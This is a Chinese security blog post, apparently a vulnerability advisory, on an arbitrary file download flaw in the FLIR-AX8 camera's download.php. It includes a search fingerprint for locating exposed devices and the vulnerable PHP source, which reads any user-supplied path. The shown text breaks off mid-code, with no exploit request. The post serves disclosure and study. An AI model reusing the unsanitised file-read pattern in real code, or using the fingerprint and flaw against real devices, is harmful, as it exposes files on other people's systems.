<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title> - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="" />
<meta property="og:description" content="FLIR-AX8 download.php 任意文件下载 漏洞描述 FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞 漏洞影响 1 FLIR-AX8 网络测绘 1 app=&#34;FLIR-FLIR-AX8&#34; 漏洞复现 登录页面 出现漏洞的文件为 download.php" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />

<meta property="og:site_name" content="Chinchin&#39;s blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://example.org/logo.png"/>

<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="FLIR-AX8 download.php 任意文件下载 漏洞描述 FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞 漏洞影响 1 FLIR-AX8 网络测绘 1 app=&#34;FLIR-FLIR-AX8&#34; 漏洞复现 登录页面 出现漏洞的文件为 download.php"/>
<meta name="twitter:site" content="@xxxx"/>
<meta name="application-name" content="Chinchin&#39;s blog">
<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" /><link rel="prev" href="http://example.org/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.org\/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\/"
        },"genre": "posts","wordcount":  874 ,
        "url": "http:\/\/example.org\/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\/","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Chinchin"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/unknownformat/" title="未知格式"> 未知格式 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/unknownformat/" title="未知格式">未知格式</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
</span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;874 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="true">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#漏洞描述">漏洞描述</a></li>
    <li><a href="#漏洞影响">漏洞影响</a></li>
    <li><a href="#网络测绘">网络测绘</a></li>
    <li><a href="#漏洞复现">漏洞复现</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="flir-ax8-downloadphp-任意文件下载">FLIR-AX8 download.php 任意文件下载</h1>
<h2 id="漏洞描述">漏洞描述</h2>
<p>FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞</p>
<h2 id="漏洞影响">漏洞影响</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLIR-AX8
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="网络测绘">网络测绘</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;FLIR-FLIR-AX8&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="漏洞复现">漏洞复现</h2>
<p>登录页面</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./images/202209131035126.png"
        data-srcset="./images/202209131035126.png, ./images/202209131035126.png 1.5x, ./images/202209131035126.png 2x"
        data-sizes="auto"
        alt="./images/202209131035126.png"
        title="image-20220913103521047" /></p>
<p>出现漏洞的文件为 <strong>download.php</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Copyright 2012 Armand Niculescu - MediaDivision.com
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * THIS SOFTWARE IS PROVIDED BY THE FREEBSD PROJECT &#34;AS IS&#34; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE FREEBSD PROJECT OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// get the file request, throw error if nothing supplied
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// hide notices
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;error_reporting&#39;</span><span class="p">,</span> <span class="k">E_ALL</span> <span class="o">&amp;</span> <span class="o">~</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//- turn off compression on the server
</span></span></span><span class="line"><span class="cl"><span class="c1">//@apache_setenv(&#39;no-gzip&#39;, 1);
</span></span></span><span class="line"><span class="cl"><span class="c1">//@ini_set(&#39;zlib.output_compression&#39;, &#39;Off&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;HTTP/1.0 400 Bad Request&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// sanitize the file request, keep just the name and extension
</span></span></span><span class="line"><span class="cl"><span class="c1">// also, replaces the file location with a preset one (&#39;./myfiles/&#39; in this example)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file_path</span>  <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path_parts</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file_name</span>  <span class="o">=</span> <span class="nv">$path_parts</span><span class="p">[</span><span class="s1">&#39;basename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file_ext</span>   <span class="o">=</span> <span class="nv">$path_parts</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// allow a file to be streamed instead of sent as an attachment
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$is_attachment</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;stream&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// make sure the file exists
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$file_size</span>  <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// set the headers, prevent caching
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Pragma: public&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Expires: -1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Cache-Control: public, must-revalidate, post-check=0, pre-check=0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Disposition: attachment; filename=</span><span class="se">\&#34;</span><span class="si">$file_name\</span><span class="s2">&#34;&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        // set appropriate headers for attachment or streamed file
</span></span></span><span class="line"><span class="cl"><span class="s2">        if (</span><span class="si">$is_attachment</span><span class="s2">) {
</span></span></span><span class="line"><span class="cl"><span class="s2">                header(&#34;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&#34;</span><span class="si">$file_name\</span><span class="s2">&#34;&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        }
</span></span></span><span class="line"><span class="cl"><span class="s2">        else {
</span></span></span><span class="line"><span class="cl"><span class="s2">                header(&#39;Content-Disposition: inline;&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">                header(&#39;Content-Transfer-Encoding: binary&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">        }
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        // set the mime type based on extension, add yours if needed.
</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$ctype_default</span><span class="s2"> = &#34;</span><span class="nx">application</span><span class="o">/</span><span class="nx">octet</span><span class="o">-</span><span class="nx">stream</span><span class="s2">&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$content_types</span><span class="s2"> = array(
</span></span></span><span class="line"><span class="cl"><span class="s2">                &#34;</span><span class="nx">exe</span><span class="s2">&#34; =&gt; &#34;</span><span class="nx">application</span><span class="o">/</span><span class="nx">octet</span><span class="o">-</span><span class="nx">stream</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                &#34;</span><span class="nx">zip</span><span class="s2">&#34; =&gt; &#34;</span><span class="nx">application</span><span class="o">/</span><span class="nx">zip</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                &#34;</span><span class="nx">mp3</span><span class="s2">&#34; =&gt; &#34;</span><span class="nx">audio</span><span class="o">/</span><span class="nx">mpeg</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                &#34;</span><span class="nx">mpg</span><span class="s2">&#34; =&gt; &#34;</span><span class="nx">video</span><span class="o">/</span><span class="nx">mpeg</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                &#34;</span><span class="nx">avi</span><span class="s2">&#34; =&gt; &#34;</span><span class="nx">video</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">msvideo</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">        );
</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$ctype</span><span class="s2"> = isset(</span><span class="si">$content_types[$file_ext]</span><span class="s2">) ? </span><span class="si">$content_types[$file_ext]</span><span class="s2"> : </span><span class="si">$ctype_default</span><span class="s2">;
</span></span></span><span class="line"><span class="cl"><span class="s2">        header(&#34;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="s2">&#34; . </span><span class="si">$ctype</span><span class="s2">);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">		//check if http_range is sent by browser (or download manager)
</span></span></span><span class="line"><span class="cl"><span class="s2">		if(isset(</span><span class="si">$_SERVER[&#39;HTTP_RANGE&#39;]</span><span class="s2">))
</span></span></span><span class="line"><span class="cl"><span class="s2">		{
</span></span></span><span class="line"><span class="cl"><span class="s2">			list(</span><span class="si">$size_unit</span><span class="s2">, </span><span class="si">$range_orig</span><span class="s2">) = explode(&#39;=&#39;, </span><span class="si">$_SERVER[&#39;HTTP_RANGE&#39;]</span><span class="s2">, 2);
</span></span></span><span class="line"><span class="cl"><span class="s2">			if (</span><span class="si">$size_unit</span><span class="s2"> == &#39;bytes&#39;)
</span></span></span><span class="line"><span class="cl"><span class="s2">			{
</span></span></span><span class="line"><span class="cl"><span class="s2">				//multiple ranges could be specified at the same time, but for simplicity only serve the first range
</span></span></span><span class="line"><span class="cl"><span class="s2">				//http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt
</span></span></span><span class="line"><span class="cl"><span class="s2">				list(</span><span class="si">$range</span><span class="s2">, </span><span class="si">$extra_ranges</span><span class="s2">) = explode(&#39;,&#39;, </span><span class="si">$range_orig</span><span class="s2">, 2);
</span></span></span><span class="line"><span class="cl"><span class="s2">			}
</span></span></span><span class="line"><span class="cl"><span class="s2">			else
</span></span></span><span class="line"><span class="cl"><span class="s2">			{
</span></span></span><span class="line"><span class="cl"><span class="s2">				</span><span class="si">$range</span><span class="s2"> = &#39;&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s2">				header(&#39;HTTP/1.1 416 Requested Range Not Satisfiable&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">				exit;
</span></span></span><span class="line"><span class="cl"><span class="s2">			}
</span></span></span><span class="line"><span class="cl"><span class="s2">		}
</span></span></span><span class="line"><span class="cl"><span class="s2">		else
</span></span></span><span class="line"><span class="cl"><span class="s2">		{
</span></span></span><span class="line"><span class="cl"><span class="s2">			</span><span class="si">$range</span><span class="s2"> = &#39;&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s2">		}
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">		//figure out download piece from range (if set)
</span></span></span><span class="line"><span class="cl"><span class="s2">		list(</span><span class="si">$seek_start</span><span class="s2">, </span><span class="si">$seek_end</span><span class="s2">) = explode(&#39;-&#39;, </span><span class="si">$range</span><span class="s2">, 2);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">		ob_clean();
</span></span></span><span class="line"><span class="cl"><span class="s2">		
</span></span></span><span class="line"><span class="cl"><span class="s2">		//set start and end based on range (if set), else set defaults
</span></span></span><span class="line"><span class="cl"><span class="s2">		//also check for invalid ranges.
</span></span></span><span class="line"><span class="cl"><span class="s2">		</span><span class="si">$seek_end</span><span class="s2">   = (empty(</span><span class="si">$seek_end</span><span class="s2">)) ? (</span><span class="si">$file_size</span><span class="s2"> - 1) : min(abs(intval(</span><span class="si">$seek_end</span><span class="s2">)),(</span><span class="si">$file_size</span><span class="s2"> - 1));
</span></span></span><span class="line"><span class="cl"><span class="s2">		</span><span class="si">$seek_start</span><span class="s2"> = (empty(</span><span class="si">$seek_start</span><span class="s2">) || </span><span class="si">$seek_end</span><span class="s2"> &lt; abs(intval(</span><span class="si">$seek_start</span><span class="s2">))) ? 0 : max(abs(intval(</span><span class="si">$seek_start</span><span class="s2">)),0);
</span></span></span><span class="line"><span class="cl"><span class="s2">	 
</span></span></span><span class="line"><span class="cl"><span class="s2">		//Only send partial content header if downloading a piece of the file (IE workaround)
</span></span></span><span class="line"><span class="cl"><span class="s2">		if (</span><span class="si">$seek_start</span><span class="s2"> &gt; 0 || </span><span class="si">$seek_end</span><span class="s2"> &lt; (</span><span class="si">$file_size</span><span class="s2"> - 1))
</span></span></span><span class="line"><span class="cl"><span class="s2">		{
</span></span></span><span class="line"><span class="cl"><span class="s2">			header(&#39;HTTP/1.1 206 Partial Content&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">			header(&#39;Content-Range: bytes &#39;.</span><span class="si">$seek_start</span><span class="s2">.&#39;-&#39;.</span><span class="si">$seek_end</span><span class="s2">.&#39;/&#39;.</span><span class="si">$file_size</span><span class="s2">);
</span></span></span><span class="line"><span class="cl"><span class="s2">			header(&#39;Content-Length: &#39;.(</span><span class="si">$seek_end</span><span class="s2"> - </span><span class="si">$seek_start</span><span class="s2"> + 1));
</span></span></span><span class="line"><span class="cl"><span class="s2">		}
</span></span></span><span class="line"><span class="cl"><span class="s2">		else
</span></span></span><span class="line"><span class="cl"><span class="s2">		  header(&#34;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="nv">$file_size</span><span class="s2">&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">		header(&#39;Accept-Ranges: bytes&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">    
</span></span></span><span class="line"><span class="cl"><span class="s2">		set_time_limit(0);
</span></span></span><span class="line"><span class="cl"><span class="s2">		fseek(</span><span class="si">$file</span><span class="s2">, </span><span class="si">$seek_start</span><span class="s2">);
</span></span></span><span class="line"><span class="cl"><span class="s2">		
</span></span></span><span class="line"><span class="cl"><span class="s2">		while(!feof(</span><span class="si">$file</span><span class="s2">)) 
</span></span></span><span class="line"><span class="cl"><span class="s2">		{
</span></span></span><span class="line"><span class="cl"><span class="s2">			print(@fread(</span><span class="si">$file</span><span class="s2">, 1024*8));
</span></span></span><span class="line"><span class="cl"><span class="s2">			ob_flush();
</span></span></span><span class="line"><span class="cl"><span class="s2">			flush();
</span></span></span><span class="line"><span class="cl"><span class="s2">			if (connection_status()!=0) 
</span></span></span><span class="line"><span class="cl"><span class="s2">			{
</span></span></span><span class="line"><span class="cl"><span class="s2">				@fclose(</span><span class="si">$file</span><span class="s2">);
</span></span></span><span class="line"><span class="cl"><span class="s2">				exit;
</span></span></span><span class="line"><span class="cl"><span class="s2">			}			
</span></span></span><span class="line"><span class="cl"><span class="s2">		}
</span></span></span><span class="line"><span class="cl"><span class="s2">		
</span></span></span><span class="line"><span class="cl"><span class="s2">		// file save was a success
</span></span></span><span class="line"><span class="cl"><span class="s2">		@fclose(</span><span class="si">$file</span><span class="s2">);
